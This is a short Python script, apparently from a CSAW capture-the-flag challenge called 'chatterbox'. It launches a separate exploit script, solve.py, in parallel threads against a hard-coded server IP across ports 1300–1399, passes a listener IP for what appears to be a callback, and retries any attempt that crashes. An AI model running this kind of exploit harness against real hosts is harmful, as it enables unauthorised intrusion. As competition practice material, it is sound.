from multiprocessing.pool import ThreadPool
import subprocess

# change these if needed
# SERVER_IP = "chatterbox.chal.csaw.io"
SERVER_IP = "3.144.218.7"
LISTENER_IP = "142.93.11.114"   
PORTS = range(1300,1400)


# run a single execution of "solve.py"
def run_exp(port):
    print(f"[*] Testing exploit on port {port}")

    try:
        output = subprocess.check_output(["python3", "solve.py", SERVER_IP, LISTENER_IP, str(port)], timeout=120)
        if b"Remote died" in output:
            run_exp(port)
    except:
        print(f"[*] Stopping test on port {port}")


p = ThreadPool(len(PORTS))
p.map(run_exp, PORTS)
p.close()
p.join()
